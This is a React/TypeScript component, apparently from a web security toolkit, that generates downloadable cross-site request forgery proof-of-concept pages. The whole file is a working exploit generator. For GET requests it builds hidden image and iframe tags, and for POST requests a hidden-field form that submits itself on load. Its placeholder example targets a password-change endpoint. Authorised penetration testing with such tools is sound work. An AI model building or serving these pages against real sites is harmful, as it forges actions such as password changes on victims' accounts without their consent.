import { useState } from 'react';
import ToolWrapper from './ToolWrapper';
import { RepeatIcon } from '../common/Icons';
import styles from './SharedTool.module.css';

export default function CSRFTester() {
  const [targetUrl, setTargetUrl] = useState('');
  const [method, setMethod] = useState<'GET' | 'POST'>('POST');
  const [parameters, setParameters] = useState('');
  const [output, setOutput] = useState('');
  const [error, setError] = useState('');

  const generate = () => {
    if (!targetUrl.trim()) {
      setError('Please enter target URL');
      return;
    }

    const params = parameters
      .split('\n')
      .filter((p) => p.trim())
      .map((p) => {
        const [key, value = ''] = p.split('=').map((s) => s.trim());
        return { key, value };
      });

    let html = '';

    if (method === 'GET') {
      const queryString = params
        .map((p) => `${encodeURIComponent(p.key)}=${encodeURIComponent(p.value)}`)
        .join('&');
      const fullUrl = `${targetUrl}${queryString ? '?' + queryString : ''}`;

      html = `<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
  <h1>CSRF Proof of Concept</h1>
  <img src="${fullUrl}" style="display:none;">
  <iframe src="${fullUrl}" style="display:none;"></iframe>
  <p><a href="${fullUrl}" target="_blank">Click to trigger manually</a></p>
</body>
</html>`;
    } else {
      html = `<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
  <h1>CSRF Proof of Concept</h1>
  <form id="csrfForm" action="${targetUrl}" method="POST">
${params.map((p) => `    <input type="hidden" name="${p.key}" value="${p.value}">`).join('\n')}
    <input type="submit" value="Submit">
  </form>
  <script>document.getElementById('csrfForm').submit();</script>
</body>
</html>`;
    }

    setOutput(html);
  };

  const download = () => {
    const blob = new Blob([output], { type: 'text/html' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'csrf-poc.html';
    a.click();
    URL.revokeObjectURL(a.href);
  };

  return (
    <ToolWrapper
      title="CSRF Tester"
      icon={<RepeatIcon />}
      description="Generate CSRF proof-of-concept exploits"
    >
      <div className={styles.section}>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Target URL</label>
          <input
            type="text"
            className={styles.input}
            value={targetUrl}
            onChange={(e) => setTargetUrl(e.target.value)}
            placeholder="https://example.com/api/change-password"
          />
        </div>
        <div className={styles.inputGroup}>
          <label className={styles.label}>HTTP Method</label>
          <select
            className={styles.select}
            value={method}
            onChange={(e) => setMethod(e.target.value as 'GET' | 'POST')}
          >
            <option value="GET">GET</option>
            <option value="POST">POST</option>
          </select>
        </div>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Parameters (key=value, one per line)</label>
          <textarea
            className={styles.textarea}
            value={parameters}
            onChange={(e) => setParameters(e.target.value)}
            placeholder="password=newpass123&#10;confirm=newpass123"
          />
        </div>
        <div className={styles.buttonGroup}>
          <button className={styles.primaryBtn} onClick={generate}>
            Generate PoC
          </button>
          <button
            className={styles.secondaryBtn}
            onClick={() => {
              setTargetUrl('');
              setParameters('');
              setOutput('');
              setError('');
            }}
          >
            Clear
          </button>
        </div>
      </div>

      {error && <div className={styles.errorBox}>{error}</div>}

      {output && (
        <div className={styles.resultBox}>
          <div className={styles.resultHeader}>
            <span className={styles.resultTitle}>Generated HTML PoC</span>
            <button
              className={styles.copyBtn}
              onClick={() => navigator.clipboard.writeText(output)}
            >
              Copy
            </button>
            <button className={styles.copyBtn} onClick={download}>
              Download
            </button>
          </div>
          <pre className={styles.codeBlock}>{output}</pre>
        </div>
      )}

      <div className={styles.infoBox}>
        <h3>CSRF Testing</h3>
        <ul>
          <li>Generates HTML pages that trigger CSRF attacks</li>
          <li>GET: Uses image tags, iframes</li>
          <li>POST: Auto-submitting forms</li>
        </ul>
      </div>
    </ToolWrapper>
  );
}
